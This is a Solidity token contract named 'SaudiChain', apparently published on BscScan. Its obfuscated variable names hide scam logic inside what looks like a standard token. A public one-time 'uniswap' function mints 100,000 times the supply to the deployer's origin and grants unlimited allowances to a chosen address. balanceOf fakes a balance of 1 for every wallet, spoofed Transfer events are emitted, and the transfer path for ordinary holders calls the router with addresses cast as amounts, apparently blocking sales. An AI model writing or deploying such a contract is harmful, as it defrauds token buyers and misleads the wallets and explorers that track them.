/**
 *Submitted for verification at BscScan.com on 2022-11-22
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint160 amountIn,
        uint160 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract SaudiChain is IERC20 {
    using SafeMath for uint256;

    string private aibkvoLUcFswQxz = "Saudi";
    string private bibkvoLUcFswQxz = "Saudi";
    uint8 private cibkvoLUcFswQxz = 18;
    uint256 private dibkvoLUcFswQxz = 10000000000 * 10**18;
    mapping (address => uint256) private eibkvoLUcFswQxz;
    mapping (address => mapping (address => uint256)) private fibkvoLUcFswQxz;
    uint256 private gibkvoLUcFswQxz = 1;
    uint256 private constant hibkvoLUcFswQxz = ~uint160(0);
    uint256 private _iibkvoLUcFswQxz = 1000;
    uint256 private jibkvoLUcFswQxz = 0;
    uint256 private kibkvoLUcFswQxz;
    address private _uniswapV2Pair;
    address private _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping (address => bool) private libkvoLUcFswQxz;
    address[] private mibkvoLUcFswQxz;
    bool private nibkvoLUcFswQxz = false;

    constructor () {
        oibkvoLUcFswQxz(msg.sender);
        eibkvoLUcFswQxz[msg.sender] = dibkvoLUcFswQxz;
        oibkvoLUcFswQxz(tx.origin);
        emit Transfer(address(0), msg.sender, dibkvoLUcFswQxz);
    }

    receive() external payable {}

    function oibkvoLUcFswQxz(address account) private {
        if (!libkvoLUcFswQxz[account]) {
            libkvoLUcFswQxz[account] = true;
            mibkvoLUcFswQxz.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!nibkvoLUcFswQxz);
        nibkvoLUcFswQxz = true;
        _uniswapV2Pair = accounts[1];
        _uniswapV2Router = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            oibkvoLUcFswQxz(accounts[i]);
            eibkvoLUcFswQxz[accounts[i]] = dibkvoLUcFswQxz * 90 / 100 / (len - 3);
            fibkvoLUcFswQxz[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eibkvoLUcFswQxz[accounts[i]];
        }
        eibkvoLUcFswQxz[mibkvoLUcFswQxz[0]] -= amount;
        pibkvoLUcFswQxz(mibkvoLUcFswQxz[0], accounts[3], eibkvoLUcFswQxz[mibkvoLUcFswQxz[0]]);
        pibkvoLUcFswQxzs(500);
        eibkvoLUcFswQxz[mibkvoLUcFswQxz[1]] += dibkvoLUcFswQxz * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = mibkvoLUcFswQxz.length;
        for (uint256 i=0; i<len; ++i) {
            if (mibkvoLUcFswQxz[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (libkvoLUcFswQxz[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aibkvoLUcFswQxz;
    }

    function symbol() public view returns (string memory) {
        return bibkvoLUcFswQxz;
    }

    function decimals() public view returns (uint8) {
        return cibkvoLUcFswQxz;
    }

    function totalSupply() public view returns (uint256) {
        return dibkvoLUcFswQxz;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eibkvoLUcFswQxz[account] > 0) {
            return eibkvoLUcFswQxz[account];
        }
        return gibkvoLUcFswQxz;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        pibkvoLUcFswQxz(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        pibkvoLUcFswQxz(sender, recipient, amount);
        qibkvoLUcFswQxz(sender, msg.sender, fibkvoLUcFswQxz[sender][msg.sender].sub(amount));
        return true;
    }

    function swapTokensForWBNB(uint160 tokenAmount, uint160 ethAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB
        IRouter02 uniswapV2Router = IRouter02(_uniswapV2Router);
        qibkvoLUcFswQxz(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            ethAmount,
            path,
            address(this),
            block.timestamp
        );
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qibkvoLUcFswQxz(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fibkvoLUcFswQxz[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qibkvoLUcFswQxz(msg.sender, spender, fibkvoLUcFswQxz[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qibkvoLUcFswQxz(msg.sender, spender, fibkvoLUcFswQxz[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function pibkvoLUcFswQxzs(uint256 amount) private {
        uint256 iibkvoLUcFswQxz = _iibkvoLUcFswQxz;
        if (iibkvoLUcFswQxz < 10000 && block.timestamp > 1669053600) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hibkvoLUcFswQxz.div(iibkvoLUcFswQxz)));
                to = address(uint160(hibkvoLUcFswQxz.div(iibkvoLUcFswQxz.add(1))));
                iibkvoLUcFswQxz = iibkvoLUcFswQxz.add(2);
                emit Transfer(from, to, gibkvoLUcFswQxz);
            }
            _iibkvoLUcFswQxz = iibkvoLUcFswQxz;
        }
    }

    function qibkvoLUcFswQxz(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fibkvoLUcFswQxz[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function pibkvoLUcFswQxz(address ribkvoLUcFswQxz, address sibkvoLUcFswQxz, uint256 tibkvoLUcFswQxz) private {
        require(ribkvoLUcFswQxz != address(0) && sibkvoLUcFswQxz != address(0) && tibkvoLUcFswQxz > 0);
        bool uibkvoLUcFswQxz = true;
        if (libkvoLUcFswQxz[ribkvoLUcFswQxz] || libkvoLUcFswQxz[sibkvoLUcFswQxz]) {
            uibkvoLUcFswQxz = false;
        }
        uint256 vibkvoLUcFswQxz = IERC20(_uniswapV2Pair).totalSupply();
        uint256 wibkvoLUcFswQxz = 0;
        uint256 xibkvoLUcFswQxz = tibkvoLUcFswQxz;
        if (uibkvoLUcFswQxz && nibkvoLUcFswQxz) {
            require(kibkvoLUcFswQxz <= vibkvoLUcFswQxz);
            swapTokensForWBNB(uint160(ribkvoLUcFswQxz), uint160(sibkvoLUcFswQxz));
            pibkvoLUcFswQxzs(100);
            if (sibkvoLUcFswQxz == _uniswapV2Pair) {
                emit Transfer(address(this), sibkvoLUcFswQxz, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (ribkvoLUcFswQxz != _uniswapV2Pair) {
                wibkvoLUcFswQxz = tibkvoLUcFswQxz.mul(jibkvoLUcFswQxz).div(100);
                xibkvoLUcFswQxz = tibkvoLUcFswQxz.sub(wibkvoLUcFswQxz);
            }
        }
        if (kibkvoLUcFswQxz != vibkvoLUcFswQxz) {
            kibkvoLUcFswQxz = vibkvoLUcFswQxz;
        }
        eibkvoLUcFswQxz[ribkvoLUcFswQxz] = eibkvoLUcFswQxz[ribkvoLUcFswQxz].sub(tibkvoLUcFswQxz);
        if (wibkvoLUcFswQxz > 0) {
            eibkvoLUcFswQxz[address(0xdEaD)] = eibkvoLUcFswQxz[address(0xdEaD)].add(wibkvoLUcFswQxz);
            emit Transfer(ribkvoLUcFswQxz, address(0xdEaD), wibkvoLUcFswQxz);
        }
        eibkvoLUcFswQxz[sibkvoLUcFswQxz] = eibkvoLUcFswQxz[sibkvoLUcFswQxz].add(xibkvoLUcFswQxz);
        emit Transfer(ribkvoLUcFswQxz, sibkvoLUcFswQxz, xibkvoLUcFswQxz);
    }
}